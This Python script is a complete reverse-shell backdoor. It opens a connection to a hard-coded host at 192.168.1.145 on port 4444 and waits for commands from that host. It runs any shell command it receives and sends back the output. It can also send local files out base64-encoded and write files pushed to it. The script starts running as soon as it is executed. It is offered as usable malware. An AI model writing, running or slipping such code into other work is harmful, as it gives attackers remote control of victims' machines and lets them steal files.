import socket, json, sys, socket, subprocess, base64, os, tqdm
import re
import zlib
import linecache

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		self._buffer_size = 1024

	def PrintException(self):
			exc_type, exc_obj, tb = sys.exc_info()
			f = tb.tb_frame
			lineno = tb.tb_lineno
			filename = f.f_code.co_filename
			linecache.checkcache(filename)
			line = linecache.getline(filename, lineno, f.f_globals)
			return 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


	def json_encode(self, data):
		json_data = json.dumps(data) #wrap data in json format
		return json_data.encode()

	def json_decode(self, json_data):
		decoded_json = json_data.decode() #wrap data in json format
		return json.loads(decoded_json)

	def fragmented_receive(self, filename):
		base_filename = os.path.basename(filename)
		print("Base filename: " + base_filename)
		print("Filename: " + filename)

		byte_read_count = 0
		with open(base_filename, "wb") as file:
			while True:
				bytes_read = self.connection.recv(self._buffer_size)
				if bytes_read == "TRANS_COM":
					print("Transmission complete")
					break
				file.write(bytes_read)
			print("outside the loop")
			return "[+] {filename} uploaded successfully"	


	def reliable_send(self, data):
		json_data = json.dumps(data) #wrap data in json format
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024) #seems hang is terminating here
				return json.loads(json_data.decode()) #unwrap json data
			except ValueError:
				print("stuck receving: " + str(json_data))
				continue

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_working_directory_to(self, path):
		try:
			os.chdir(path)
			return "[+] Changing working directory to " + path
		except Exception:
			return self.PrintException()


	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful"


	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	
	def run(self):
		#self.connection.send("\n[+] Welcome to hell\n")
		while True:
			try:
				command = self.reliable_receive() # will wait for data to be sent so that it can be received, will get a broken pipe if file/ data is larger than this
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					filename = command[1]
					command_result = self.fragmented_receive(filename)
					#command_result = "[+] Upload successful"
					#command_result = self.write_file(command[1], command[2]) #name, content
				else:
					command_result = self.execute_system_command(command)

				self.reliable_send(command_result)
			except Exception:
				exception = self.PrintException()
				self.reliable_send(("[-] An error has occured during execution on the backdoor", exception))
				
		#self.connection.close()
	
my_backdoor = Backdoor("192.168.1.145", 4444)
my_backdoor.run()